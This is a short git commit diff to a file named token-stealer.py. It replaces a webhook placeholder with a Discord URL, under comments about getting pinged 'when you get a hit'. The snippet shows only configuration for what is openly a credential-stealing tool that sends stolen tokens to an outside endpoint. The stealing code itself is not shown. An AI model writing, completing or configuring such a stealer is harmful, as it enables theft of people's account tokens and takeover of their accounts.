e0a1e52cdafa32fe32ba4d188296276bcc9b3d35
Lunor1s <163518905+Lunor1s@users.noreply.github.com>
2024-03-15 12:50:09 +0300

    Update token-stealer.py

--- token-stealer.py
+++ token-stealer.py
@@ -3,7 +3,7 @@ import os
 from urllib.request import Request, urlopen
 
 # your webhook URL
-WEBHOOK_URL = "WEBHOOK HERE"
+WEBHOOK_URL = "https://discord.com/api/guilds/1218131622457643008/widget.json"
 
 # mentions you when you get a hit
 PING_ME = False
